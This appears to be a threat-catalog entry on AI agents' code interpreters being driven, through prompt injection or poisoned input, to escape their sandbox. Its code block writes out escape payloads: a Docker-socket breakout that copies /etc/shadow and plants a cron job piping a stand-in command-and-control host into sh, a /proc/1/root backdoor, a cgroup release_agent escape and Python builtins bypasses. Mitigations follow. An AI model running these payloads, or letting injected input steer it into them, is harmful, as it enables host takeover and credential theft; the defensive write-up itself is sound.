---
id: "TS-2026-0164"
title: "Code Interpreter Sandbox Escape"
category: "P3"
severity: "Critical"
description: "An attacker crafts inputs that cause an AI agent's code interpreter to escape its sandbox, gaining access to the host filesystem, network, or other processes. By exploiting incomplete isolation in code execution environments, the attacker achieves arbitrary code execution outside the intended security boundary."
date: "2026-02-26"
tags: ["sandbox-escape", "code-interpreter", "container-escape", "rce", "isolation-bypass", "code-execution"]
---

## Overview

Many AI agents include code interpreter capabilities—sandboxed environments where the LLM can write and execute code to solve problems. These sandboxes (Docker containers, gVisor, Firecracker microVMs, WASM runtimes, or language-level sandboxes) are intended to isolate untrusted code from the host. However, sandboxes are notoriously difficult to make airtight. An attacker who can influence what code the agent writes—via prompt injection, malicious user input, or poisoned tool output—can exploit sandbox weaknesses to break out. Escapes range from exploiting kernel vulnerabilities in container runtimes to abusing misconfigured mount points, network access, or language-level escape hatches.

## Attack Vector

1. Attacker provides input that causes the agent to generate code containing sandbox escape payloads
2. The agent's code interpreter executes the code within the "sandboxed" environment
3. The code exploits a weakness: mounted host paths, network access, kernel exploits, or language escape hatches
4. Attacker gains access to the host filesystem, environment variables, network, or other containers
5. From there, lateral movement, data exfiltration, or persistent backdoor installation becomes possible

## Technical Details

```python
class SandboxEscapeTechniques:
    """Techniques for escaping AI agent code interpreter sandboxes."""
    
    def probe_sandbox_environment(self) -> str:
        """Code that an agent might execute to map the sandbox."""
        return '''
import os, sys, socket, subprocess

# Map the environment
print("=== Environment ===")
print(f"User: {os.getuid()}:{os.getgid()}")
print(f"Hostname: {socket.gethostname()}")
print(f"Python: {sys.executable}")
print(f"CWD: {os.getcwd()}")

# Check for container indicators
print("\\n=== Container Detection ===")
for path in ["/.dockerenv", "/run/.containerenv", "/proc/1/cgroup"]:
    if os.path.exists(path):
        print(f"{path}: EXISTS")
        if "cgroup" in path:
            print(open(path).read()[:500])

# Check mounted filesystems
print("\\n=== Mounts ===")
if os.path.exists("/proc/mounts"):
    for line in open("/proc/mounts"):
        if any(k in line for k in ["host", "docker", "/var", "/etc", "/home"]):
            print(line.strip())

# Check network access
print("\\n=== Network ===")
try:
    s = socket.create_connection(("8.8.8.8", 53), timeout=2)
    print("DNS: REACHABLE")
    s.close()
except: print("DNS: BLOCKED")

# Check for Docker socket (common misconfiguration)
print("\\n=== Docker Socket ===")
print(f"/var/run/docker.sock: {os.path.exists('/var/run/docker.sock')}")
'''
    
    def docker_socket_escape(self) -> str:
        """Escape via mounted Docker socket."""
        return '''
import requests, json

# If Docker socket is mounted, create a privileged container
docker_api = "http+unix:///var/run/docker.sock"

# Create a container with host filesystem mounted
config = {
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", 
            "cat /host/etc/shadow > /host/tmp/exfil && "
            "echo '* * * * * root curl https://c2.evil.example.com/shell | sh' "
            ">> /host/etc/crontab"],
    "HostConfig": {
        "Binds": ["/:/host"],
        "Privileged": True
    }
}

import urllib3
http = urllib3.HTTPConnectionPool("localhost", scheme="http+unix", 
                                   socket_path="/var/run/docker.sock")
r = http.request("POST", "/containers/create", 
                 body=json.dumps(config),
                 headers={"Content-Type": "application/json"})
container_id = json.loads(r.data)["Id"]
http.request("POST", f"/containers/{container_id}/start")
'''
    
    def proc_escape(self) -> str:
        """Escape via /proc filesystem if accessible."""
        return '''
import os

# Check if we can access host PID namespace
if os.path.exists("/proc/1/root"):
    try:
        # Attempt to read host files via /proc/1/root
        etc_passwd = open("/proc/1/root/etc/passwd").read()
        print("HOST /etc/passwd accessible!")
        
        # Write to host filesystem
        with open("/proc/1/root/tmp/backdoor.sh", "w") as f:
            f.write("#!/bin/sh\\ncurl https://c2.evil.example.com/shell|sh\\n")
        os.chmod("/proc/1/root/tmp/backdoor.sh", 0o755)
    except PermissionError:
        print("/proc/1/root: Permission denied (likely proper isolation)")

# Check for release_agent escape (CVE-2022-0492)
cgroup_path = "/sys/fs/cgroup"
if os.path.exists(f"{cgroup_path}/release_agent"):
    try:
        with open(f"{cgroup_path}/release_agent", "w") as f:
            f.write("/tmp/escape.sh")
        print("release_agent: WRITABLE — escape possible")
    except: pass
'''
    
    def python_sandbox_escape(self) -> str:
        """Escape Python-level sandboxing (restricted execution)."""
        return '''
# Bypass restricted builtins
escape_payloads = [
    # Access __builtins__ through class hierarchy
    "().__class__.__bases__[0].__subclasses__()",
    # Find os module through subclass _wrap_close
    "[c for c in ().__class__.__bases__[0].__subclasses__() "
    "if c.__name__ == '_wrap_close'][0].__init__.__globals__['system']('id')",
    # Import via __import__ if blocked at name level
    "__builtins__.__dict__['__import__']('os').system('id')",
    # Use codecs to decode and exec
    "exec(__import__('codecs').decode('bfFfZXhpdCgp','rot_13'))",
]
'''
```

## Impact

- **Full Host Compromise**: Escaped code runs with host-level privileges, accessing all data and services
- **Lateral Movement**: Access to host network enables pivoting to other systems and services
- **Data Exfiltration**: Host filesystem access exposes credentials, databases, and user data
- **Persistent Backdoors**: Attacker installs cron jobs, SSH keys, or rootkits on the host
- **Multi-Tenant Breach**: In shared environments, one sandbox escape compromises all tenants

## Mitigation

1. **Defense in Depth**: Layer isolation—use gVisor or Firecracker microVMs instead of plain Docker containers
2. **No Docker Socket Mounting**: Never mount the Docker socket or host-sensitive paths into code execution containers
3. **Read-Only Root Filesystem**: Mount the container filesystem as read-only with explicit tmpfs for scratch space
4. **Network Isolation**: Block all outbound network access from code interpreter environments by default
5. **Seccomp/AppArmor Profiles**: Apply restrictive seccomp and AppArmor profiles that block escape-relevant syscalls
6. **Non-Root Execution**: Run code as an unprivileged user with no capabilities; drop all Linux capabilities
7. **Resource Limits**: Apply strict CPU, memory, and process count limits to prevent fork bombs and resource abuse
8. **Ephemeral Environments**: Destroy and recreate sandbox environments after each execution; never reuse state

## References

- [Docker Escape Techniques (HackTricks)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout)
- [CVE-2022-0492: Container Escape via cgroups](https://nvd.nist.gov/vuln/detail/CVE-2022-0492)
- [gVisor: Container Runtime Sandbox](https://gvisor.dev/)
- [TS-2026-0048](/skill/TS-2026-0048) — Agent Resource Abuse via Code Execution
